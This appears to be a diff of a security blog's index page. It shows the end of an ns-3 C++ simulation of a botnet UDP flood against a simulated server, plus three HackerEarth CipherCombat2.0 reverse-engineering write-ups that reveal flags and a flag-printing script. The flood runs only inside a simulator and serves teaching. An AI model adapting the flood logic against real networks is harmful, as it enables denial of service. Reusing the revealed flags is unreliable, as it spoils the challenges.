+    <span class="n">pp1</span><span class="p">.</span><span class="n">SetChannelAttribute</span><span class="p">(</span><span class="s">"Delay"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"1ms"</span><span class="p">));</span>
+
+    <span class="n">pp2</span><span class="p">.</span><span class="n">SetDeviceAttribute</span><span class="p">(</span><span class="s">"DataRate"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"100Mbps"</span><span class="p">));</span>
+    <span class="n">pp2</span><span class="p">.</span><span class="n">SetChannelAttribute</span><span class="p">(</span><span class="s">"Delay"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"1ms"</span><span class="p">));</span>
+
+    <span class="c1">// Install the Point-To-Point Connections between Nodes</span>
+    <span class="n">NetDeviceContainer</span> <span class="n">d02</span><span class="p">,</span> <span class="n">d12</span><span class="p">,</span> <span class="n">botDeviceContainer</span><span class="p">[</span><span class="n">NUMBER_OF_BOTS</span><span class="p">];</span>
+    <span class="n">d02</span> <span class="o">=</span> <span class="n">pp1</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+    <span class="n">d12</span> <span class="o">=</span> <span class="n">pp1</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">2</span><span class="p">));</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUMBER_OF_BOTS</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">botDeviceContainer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">pp2</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">botNodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Assign IP to bots</span>
+    <span class="n">InternetStackHelper</span> <span class="n">stack</span><span class="p">;</span>
+    <span class="n">stack</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">);</span>
+    <span class="n">stack</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">botNodes</span><span class="p">);</span>
+    <span class="n">Ipv4AddressHelper</span> <span class="n">ipv4_n</span><span class="p">;</span>
+    <span class="n">ipv4_n</span><span class="p">.</span><span class="n">SetBase</span><span class="p">(</span><span class="s">"10.0.0.0"</span><span class="p">,</span> <span class="s">"255.255.255.252"</span><span class="p">);</span>
+
+    <span class="n">Ipv4AddressHelper</span> <span class="n">a02</span><span class="p">,</span> <span class="n">a12</span><span class="p">,</span> <span class="n">a23</span><span class="p">,</span> <span class="n">a34</span><span class="p">;</span>
+    <span class="n">a02</span><span class="p">.</span><span class="n">SetBase</span><span class="p">(</span><span class="s">"10.1.1.0"</span><span class="p">,</span> <span class="s">"255.255.255.0"</span><span class="p">);</span>
+    <span class="n">a12</span><span class="p">.</span><span class="n">SetBase</span><span class="p">(</span><span class="s">"10.1.2.0"</span><span class="p">,</span> <span class="s">"255.255.255.0"</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">NUMBER_OF_BOTS</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">ipv4_n</span><span class="p">.</span><span class="n">Assign</span><span class="p">(</span><span class="n">botDeviceContainer</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
+        <span class="n">ipv4_n</span><span class="p">.</span><span class="n">NewNetwork</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Assign IP to legitimate nodes</span>
+    <span class="n">Ipv4InterfaceContainer</span> <span class="n">i02</span><span class="p">,</span> <span class="n">i12</span><span class="p">;</span>
+    <span class="n">i02</span> <span class="o">=</span> <span class="n">a02</span><span class="p">.</span><span class="n">Assign</span><span class="p">(</span><span class="n">d02</span><span class="p">);</span>
+    <span class="n">i12</span> <span class="o">=</span> <span class="n">a12</span><span class="p">.</span><span class="n">Assign</span><span class="p">(</span><span class="n">d12</span><span class="p">);</span>
+
+    <span class="c1">// DDoS Application Behaviour</span>
+    <span class="n">OnOffHelper</span> <span class="n">onoff</span><span class="p">(</span><span class="s">"ns3::UdpSocketFactory"</span><span class="p">,</span> <span class="n">Address</span><span class="p">(</span><span class="n">InetSocketAddress</span><span class="p">(</span><span class="n">i12</span><span class="p">.</span><span class="n">GetAddress</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">UDP_SINK_PORT</span><span class="p">)));</span>
+    <span class="n">onoff</span><span class="p">.</span><span class="n">SetConstantRate</span><span class="p">(</span><span class="n">DataRate</span><span class="p">(</span><span class="n">DDOS_RATE</span><span class="p">));</span>
+    <span class="n">onoff</span><span class="p">.</span><span class="n">SetAttribute</span><span class="p">(</span><span class="s">"OnTime"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"ns3::ConstantRandomVariable[Constant=30]"</span><span class="p">));</span>
+    <span class="n">onoff</span><span class="p">.</span><span class="n">SetAttribute</span><span class="p">(</span><span class="s">"OffTime"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"ns3::ConstantRandomVariable[Constant=0]"</span><span class="p">));</span>
+    <span class="n">ApplicationContainer</span> <span class="n">onOffApp</span><span class="p">[</span><span class="n">NUMBER_OF_BOTS</span><span class="p">];</span>
+
+    <span class="c1">//Install application in all bots</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">NUMBER_OF_BOTS</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">onOffApp</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">onoff</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">botNodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="n">k</span><span class="p">));</span>
+        <span class="n">onOffApp</span><span class="p">[</span><span class="n">k</span><span class="p">].</span><span class="n">Start</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="mf">0.0</span><span class="p">));</span>
+        <span class="n">onOffApp</span><span class="p">[</span><span class="n">k</span><span class="p">].</span><span class="n">Stop</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="n">MAX_SIMULATION_TIME</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Sender Application (Packets generated by this application are throttled)</span>
+    <span class="n">BulkSendHelper</span> <span class="n">bulkSend</span><span class="p">(</span><span class="s">"ns3::TcpSocketFactory"</span><span class="p">,</span> <span class="n">InetSocketAddress</span><span class="p">(</span><span class="n">i12</span><span class="p">.</span><span class="n">GetAddress</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">TCP_SINK_PORT</span><span class="p">));</span>
+    <span class="n">bulkSend</span><span class="p">.</span><span class="n">SetAttribute</span><span class="p">(</span><span class="s">"MaxBytes"</span><span class="p">,</span> <span class="n">UintegerValue</span><span class="p">(</span><span class="n">MAX_BULK_BYTES</span><span class="p">));</span>
+    <span class="n">ApplicationContainer</span> <span class="n">bulkSendApp</span> <span class="o">=</span> <span class="n">bulkSend</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+    <span class="n">bulkSendApp</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="mf">0.0</span><span class="p">));</span>
+    <span class="n">bulkSendApp</span><span class="p">.</span><span class="n">Stop</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="n">MAX_SIMULATION_TIME</span> <span class="o">-</span> <span class="mi">10</span><span class="p">));</span>
+
+    <span class="c1">// UDPSink on receiver side</span>
+    <span class="n">PacketSinkHelper</span> <span class="n">UDPsink</span><span class="p">(</span><span class="s">"ns3::UdpSocketFactory"</span><span class="p">,</span>
+                             <span class="n">Address</span><span class="p">(</span><span class="n">InetSocketAddress</span><span class="p">(</span><span class="n">Ipv4Address</span><span class="o">::</span><span class="n">GetAny</span><span class="p">(),</span> <span class="n">UDP_SINK_PORT</span><span class="p">)));</span>
+    <span class="n">ApplicationContainer</span> <span class="n">UDPSinkApp</span> <span class="o">=</span> <span class="n">UDPsink</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">2</span><span class="p">));</span>
+    <span class="n">UDPSinkApp</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="mf">0.0</span><span class="p">));</span>
+    <span class="n">UDPSinkApp</span><span class="p">.</span><span class="n">Stop</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="n">MAX_SIMULATION_TIME</span><span class="p">));</span>
+
+    <span class="c1">// TCP Sink Application on server side</span>
+    <span class="n">PacketSinkHelper</span> <span class="n">TCPsink</span><span class="p">(</span><span class="s">"ns3::TcpSocketFactory"</span><span class="p">,</span>
+                             <span class="n">InetSocketAddress</span><span class="p">(</span><span class="n">Ipv4Address</span><span class="o">::</span><span class="n">GetAny</span><span class="p">(),</span> <span class="n">TCP_SINK_PORT</span><span class="p">));</span>
+    <span class="n">ApplicationContainer</span> <span class="n">TCPSinkApp</span> <span class="o">=</span> <span class="n">TCPsink</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">2</span><span class="p">));</span>
+    <span class="n">TCPSinkApp</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="mf">0.0</span><span class="p">));</span>
+    <span class="n">TCPSinkApp</span><span class="p">.</span><span class="n">Stop</span><span class="p">(</span><span class="n">Seconds</span><span class="p">(</span><span class="n">MAX_SIMULATION_TIME</span><span class="p">));</span>
+
+    <span class="n">Ipv4GlobalRoutingHelper</span><span class="o">::</span><span class="n">PopulateRoutingTables</span><span class="p">();</span>
+
+    <span class="c1">//Simulation NetAnim configuration and node placement</span>
+    <span class="n">MobilityHelper</span> <span class="n">mobility</span><span class="p">;</span>
+
+    <span class="n">mobility</span><span class="p">.</span><span class="n">SetPositionAllocator</span><span class="p">(</span><span class="s">"ns3::GridPositionAllocator"</span><span class="p">,</span>
+                                  <span class="s">"MinX"</span><span class="p">,</span> <span class="n">DoubleValue</span><span class="p">(</span><span class="mf">0.0</span><span class="p">),</span> <span class="s">"MinY"</span><span class="p">,</span> <span class="n">DoubleValue</span><span class="p">(</span><span class="mf">0.0</span><span class="p">),</span> <span class="s">"DeltaX"</span><span class="p">,</span> <span class="n">DoubleValue</span><span class="p">(</span><span class="mf">5.0</span><span class="p">),</span> <span class="s">"DeltaY"</span><span class="p">,</span> <span class="n">DoubleValue</span><span class="p">(</span><span class="mf">10.0</span><span class="p">),</span>
+                                  <span class="s">"GridWidth"</span><span class="p">,</span> <span class="n">UintegerValue</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span> <span class="s">"LayoutType"</span><span class="p">,</span> <span class="n">StringValue</span><span class="p">(</span><span class="s">"RowFirst"</span><span class="p">));</span>
+
+    <span class="n">mobility</span><span class="p">.</span><span class="n">SetMobilityModel</span><span class="p">(</span><span class="s">"ns3::ConstantPositionMobilityModel"</span><span class="p">);</span>
+
+    <span class="n">mobility</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">nodes</span><span class="p">);</span>
+    <span class="n">mobility</span><span class="p">.</span><span class="n">Install</span><span class="p">(</span><span class="n">botNodes</span><span class="p">);</span>
+
+    <span class="n">AnimationInterface</span> <span class="n">anim</span><span class="p">(</span><span class="s">"DDoSim.xml"</span><span class="p">);</span>
+
+    <span class="n">ns3</span><span class="o">::</span><span class="n">AnimationInterface</span><span class="o">::</span><span class="n">SetConstantPosition</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">ns3</span><span class="o">::</span><span class="n">AnimationInterface</span><span class="o">::</span><span class="n">SetConstantPosition</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+    <span class="n">ns3</span><span class="o">::</span><span class="n">AnimationInterface</span><span class="o">::</span><span class="n">SetConstantPosition</span><span class="p">(</span><span class="n">nodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+
+    <span class="kt">uint32_t</span> <span class="n">x_pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">l</span> <span class="o">&lt;</span> <span class="n">NUMBER_OF_BOTS</span><span class="p">;</span> <span class="o">++</span><span class="n">l</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">ns3</span><span class="o">::</span><span class="n">AnimationInterface</span><span class="o">::</span><span class="n">SetConstantPosition</span><span class="p">(</span><span class="n">botNodes</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="n">l</span><span class="p">),</span> <span class="n">x_pos</span><span class="o">++</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Run the Simulation</span>
+    <span class="n">Simulator</span><span class="o">::</span><span class="n">Run</span><span class="p">();</span>
+    <span class="n">Simulator</span><span class="o">::</span><span class="n">Destroy</span><span class="p">();</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+<h3 id="simulation-result">Simulation Result</h3>
+
+<p>Let’s build the project and check our simulations.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./waf <span class="nt">--run</span> DDoSim
+</code></pre></div></div>
+<p><img src="https://miro.medium.com/max/700/1*bfscwe_3yJ2EDK8Wsa6ssg.png" alt="" />(“Building Simulation with waf”)</p>
+
+<p>After that we should have DDoSim.xml which we can load in NetAnim for Simulation.</p>
+
+<h4 id="with-1-bot">With 1 Bot</h4>
+
+<p><img src="/assets/images/1botsim.gif" alt="" /></p>
+
+<p>Here we can see that there is not much interference in network speed. and Alice is able to complete the file transfer.</p>
+
+<h4 id="with-10-bots">With 10 Bots</h4>
+
+<p><img src="/assets/images/10botsim.gif" alt="" />
+Here we can see significant effect on network speed and the after 2nd packet client is struggling in receiving requested resources.</p>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>We can experiment with the above program and increase or decrease number of bots, bandwidth etc and observe the effect on the network.</p>
+
+<p>I hope this will help you to visualize DDoS and get some technical insight.</p>
+
+<p>The code is under GNU General Public License v3.0, so it can be used anywhere with proper citation.</p>
+
+<p>That’s all for this article, will see you in next one.</p>
+
+<p>Till then stay Caffeinated !</p>
+
+<h5 id="resources">Resources</h5>
+
+<table>
+  <tbody>
+    <tr>
+      <td>NS-3 Docs : <a href="https://www.nsnam.org/">Official Website</a></td>
+      <td><a href="https://www.nsnam.org/docs/tutorial/html/">NSNAM Tutorials</a></td>
+      <td><a href="https://www.nsnam.org/documentation/">Official Documentation</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>–</p>
 
     
 
@@ -386,8 +909,6 @@ Distributed Denial of Service Attack Simuation Build from scratch in C++
       
       
 
-      
-        <a href="/2020/08/10/DDoS-Simulation-in-NS3-C++.html">More &hellip;</a>
       
     
   </article>
@@ -411,6 +932,153 @@ Distributed Denial of Service Attack Simuation Build from scratch in C++
 Reverse Engineering Challenge of Hacker Earth CipherCombat2.0
 </div>
 
+<p><img src="https://miro.medium.com/max/986/1*5HJibwnLn_XKQpwXrS_AJg.png" alt="" /></p>
+
+<h3 id="what-we-get">What we get?</h3>
+
+<p>A zip file with password “hakerearth”… In there we find a PNG image</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*0grm3yTRon_G1N1rVhir4Q.png" alt="" /></p>
+
+<p>Checking the file for strings and embedded files we find nothing, and this is reverse engineering challenge so we will not go for stenography mumbo jumbo.</p>
+
+<h3 id="lets-solve-this">Let’s Solve this</h3>
+
+<p>Looking at the image, we can see it’s Graph representation of assembly code, and here is the image we get :-</p>
+
+<p><img src="https://miro.medium.com/max/3510/1*L7e4TQtggVNv8lVNdJayWw.png" alt="" /></p>
+
+<p>Now let’s try to understand what this is trying to do.</p>
+
+<h4 id="1st-block">1st Block</h4>
+
+<p><img src="https://miro.medium.com/max/1000/1*4Wqzg1mliI6Icey6dz102Q.png" alt="" /></p>
+
+<p>The first block is our MAIN() function taking some arguments</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>argc = no of arguments
+
+argv = argument pointer
+
+envp = enviornment pointer
+
+It initializes bunch of variables and then stack setting routine.
+</code></pre></div></div>
+
+<p>we also see that it compares argc with 1 followed by JE condition</p>
+
+<p>checking number of arguments should be equal to 2, argv[0] is always program name and argv[1] is our supplied password. That means we have to give <strong>exactly ONE parameter</strong> to the program.</p>
+
+<p><img src="https://miro.medium.com/max/1000/1*WrOeYnyhUO_IukWtAGUb8Q.png" alt="" /></p>
+
+<p>If the condition is not satisfied it’s putting 1 in EAX (that’s our return register) and then returning from the main() routine, that’s equivalent to <code class="language-plaintext highlighter-rouge">exit(1);</code>, but here implemented through <code class="language-plaintext highlighter-rouge">return 1;</code></p>
+
+<h4 id="2nd-block">2nd Block</h4>
+
+<p><img src="https://miro.medium.com/max/1000/1*pkXCvu2IckRwOkC4UCNHXg.png" alt="" /></p>
+
+<p>Most of this block is just initialization of some variables and then a jump statement to get to next block.</p>
+
+<p>also interesting thing to notice is that address spaces are separated by 4bytes each, looks similar? Yes, it’s character <strong>array allocation of 15 characters.</strong></p>
+
+<p>then it sets <strong>var_4h = 1</strong></p>
+
+<p>Let’s start building the program to side by side…</p>
+
+<p><img src="https://miro.medium.com/max/2000/1*ucuhdJV_NSM0XJqK_LZnWw.png" alt="" title="Array Recreated in Python" /></p>
+
+<h4 id="3rd-block">3rd Block</h4>
+
+<p><img src="https://miro.medium.com/max/1000/1*baW1SBXF4GzcBL_vmlhuVg.png" alt="" /></p>
+
+<p>Now this looks like</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Initialize a var &gt; do something &gt; add 1 to it&gt; check if var =&gt;0xf i.e (15)base &gt; repeat
+</code></pre></div></div>
+
+<p>Looks familiar? loops something with increasing variable?</p>
+
+<p>It’s nothing but a <strong>for()/while()</strong> loop implementation which iterates for 15 times, same as our character array length.</p>
+
+<p>so let’s define it as</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="n">i</span><span class="err">≤</span><span class="mi">15</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span> <span class="n">loop</span> <span class="n">body</span> <span class="p">}</span>
+</code></pre></div></div>
+<p>also, at the end of loop body it compares something and if it fails it shows “Better Luck next time” and then exit.</p>
+
+<p>Other wise it completes the loop and exit with “c0ngrats!” message.</p>
+
+<h4 id="the-loop-body">The Loop Body</h4>
+
+<p><img src="https://miro.medium.com/max/898/1*zsGBKxn_DxW26ofiVq6_Bw.png" alt="" /></p>
+
+<p>The loop body is pretty interesting, it might look intimidating to new reverse engineer but it’s really simple.With some experience, you can already tell what it’s doing.</p>
+
+<p>Let’s have a look at it.</p>
+
+<p>now as we know it’s a loop and var_4h is our control variable let’s call it “i”. First we load the value of i in EAX, then we load the address of rax*8 to RDX, and then move our ARGUMENT(var_60h) into RAX. Then we do logical and RAX,RDX and mov Quad Word value at address of RAX to RAX, now we Move with Zero extended (movzx) byte value of RAX to …… ahhhhh… i am pretty sure this does not make it easier for you to understand it, all i am doing is dictating the instructions one by one…</p>
+
+<blockquote>
+  <p>Know this : Look at it, remember the pattern and know that it is one of the methods compilers implement <strong>fetching an element at some given index.</strong></p>
+</blockquote>
+
+<p>You can ofcourse take some values yourself and try this but the full explaination is out of scope for this writeup, also it will make it boring and long enough.</p>
+
+<p>Some important instruction reference (links):</p>
+
+<p><a href="https://www.felixcloutier.com/x86/cbw:cwde:cdqe">Convert Doubleword to Quadword (CDQE)</a></p>
+
+<p><a href="https://www.felixcloutier.com/x86/movzx">Move with Zero-Extend (MOVZX)</a></p>
+
+<p><a href="https://www.felixcloutier.com/x86/movsx:movsxd">Move with Sign-Extension (MOVSX)</a></p>
+
+<p>Okay so what it actually did? Lemme explain:</p>
+
+<ol>
+  <li>Take value at [i-1] index from our argument <strong>=argv[i-1] let’s say = arg</strong></li>
+  <li>Take value at [i-1] index from our character array = charp[i-1]</li>
+  <li>Add i to our charp = charp[i-1]+i</li>
+  <li>Add 1 to Step3 = <strong>charp[i-1]+i+1 , let’s say = charpnew</strong></li>
+  <li>Compare <strong>arg == charpnew</strong>.</li>
+</ol>
+
+<p><img src="https://miro.medium.com/max/200/1*bdGkZ4cylX17rnq36F7DJA.png" alt="" /></p>
+
+<p>These instructions are responsible for step 3 and 4, remember we stored our i in EAX ? and then we add EAX (i.e. i )to ECX, our element which is stored in EAX and then again add 1 to new EAX.</p>
+
+<p>and now converting it to code we have :</p>
+
+<p><img src="https://miro.medium.com/max/1324/1*SnTdBpFKV0kYQU_rqXCEvA.png" alt="" title="Code reversed from Assembly Graph" /></p>
+
+<p>Now instead of checking the flag we can print it !!</p>
+
+<p>Here’s is relatively clean Python Implementation of above algorithm, Running it spits out the flag.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python3
+</span><span class="n">given_array</span><span class="o">=</span><span class="p">[</span><span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> 
+             <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span>
+             <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">]</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">given_array</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">given_array</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+
+
+<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="https://miro.medium.com/max/1400/1*-Cw8YRpP7UzyLHpl7eFzWg.png" alt="" /></p>
+
+<p>And we got the flag <strong>HE{shift3r_returns}</strong> we can also check it with the C++ program we reconstructed.</p>
+
+<p><img src="https://miro.medium.com/max/2000/1*TKgw7s99BDWM9zeHEcGHew.png" alt="" /></p>
+
+<p>That’s it for this challenge, actually an easy one, just some basic experience in reverse engineering needed.</p>
+
+<hr />
 
     
 
@@ -419,8 +1087,6 @@ Reverse Engineering Challenge of Hacker Earth CipherCombat2.0
       
       
 
-      
-        <a href="/2020/04/13/CipherCombat2-Shifter2.html">More &hellip;</a>
       
     
   </article>
@@ -444,6 +1110,51 @@ Reverse Engineering Challenge of Hacker Earth CipherCombat2.0
 Reverse Engineering Challenge of Hacker Earth CipherCombat2.0
 </div>
 
+<p><img src="https://miro.medium.com/max/976/1*er3VhPR2dIn2nI7BXu_uVg.png" alt="" title="Question Header" /></p>
+
+<h3 id="what-we-get-">What we get ?</h3>
+
+<p>We get a zip file with our binary in it with password hackerearth.
+<img src="https://miro.medium.com/max/1400/1*YlLxAp6kziXd1d_db8HIUA.png" alt="" /></p>
+
+<p>After unzipping the file, we can start looking at the binary.</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*gYTW45PJ_L2Zap_-KENFlw.png" alt="" /></p>
+
+<p>Important stuff : it’s Linux Executable and not stripped… This makes task easier.</p>
+
+<h3 id="solving-the-challenge">Solving the challenge</h3>
+
+<p>Let’s make the file executable by chmod.</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*zLCzrFMLMXOzhGJfirn2Bg.png" alt="" /></p>
+
+<p>now let’s run it once and see what it actually does…</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*X657SCKYqyTcoQsLsdrSvA.png" alt="" /></p>
+
+<p>So seems like some type password check, and the name of challenge checks out !</p>
+
+<p>Let’s Disassemble it and try to understand the checking mechanism.</p>
+
+<p>doing Strings on the file we get something interesting…</p>
+
+<p><img src="https://miro.medium.com/max/1262/1*jcUCXvcFuhsdFUZUODtQEQ.png" alt="" /></p>
+
+<p>Looks like good password? Also if we see the disassembly we see main calls the <strong>fun2()</strong> function before <strong>test eax,eax</strong> at <strong>0x000012d7</strong> which controls the flow of program… and see what it compares! the same string !</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*MvkJYxg2J9qjStMB20DYIw.png" alt="" />
+<img src="https://miro.medium.com/max/1400/1*s1VfuFXEvf_Z5GjST_vXVg.png" alt="" /></p>
+
+<p>Let’s just try this as password…</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*3oQeagCI-u_3zWlyJxgr6g.png" alt="" /></p>
+
+<p>And that works ! submit the flag and get them points…</p>
+
+<h3 id="about-ctf">About CTF</h3>
+
+<p>Hacker Earth’s CipherCombat2.0 was great CTF for beginners in the security field. Overall nice refresher.</p>
 
     
 
@@ -452,8 +1163,6 @@ Reverse Engineering Challenge of Hacker Earth CipherCombat2.0
       
       
 
-      
-        <a href="/2020/04/13/CipherCombat2-Locked.html">More &hellip;</a>
       
     
   </article>
@@ -477,6 +1186,92 @@ Reverse Engineering Challenge of Hacker Earth CipherCombat2.0
 Reverse Engineering Challenge of Hacker Earth CipherCombat2.0
 </div>
 
+<p><img src="https://miro.medium.com/max/916/1*Nuc4N5RaZtr63_YQFhz_0g.png" alt="" /></p>
+
+<h3 id="what-we-get">What we get?</h3>
+
+<p>A zip file with password “hackerearth”… unzip it and we get a Linux Executable
+<img src="https://miro.medium.com/max/1400/1*vAjPVcnwMkk3vsJWwFYvCw.png" alt="" /></p>
+
+<p>Notice I highlighted LSB(Least Significant Bit) ? We will see why later…</p>
+
+<h3 id="solving-the-challenge">Solving the challenge</h3>
+
+<p>Let’s do strings …</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*QituOMU8zpAkklSEngDR6g.png" alt="" /></p>
+
+<p>With strings we found some Texts but nothing like our flag.</p>
+
+<p>Important thing to see here is <strong>MD5 function calls</strong> and use of <strong>libcrypto.so.1.1</strong> points at use of MD5 hash algorithm.</p>
+
+<p>Further we can check this by listing all imports by RABIN2</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*Zs5ILlbbLfM-sZEeRbzljw.png" alt="" /></p>
+
+<p>And we see that MD5 global functions are important.</p>
+
+<p>Let’s check the disassembly now…</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*mPe6hOAoX4GAUC4DhYytVA.png" alt="" /></p>
+
+<p>We can see that it compares the MD5 digest of string supplied with a hard coded MD5 value. We can also see it has moved hard-coded hex string to stack at <strong>0x000011ad</strong></p>
+
+<p>Any ways, it is comparing with something in stack, and my favorite way is to fire up GDB and check the stack in real-time to get the data.</p>
+
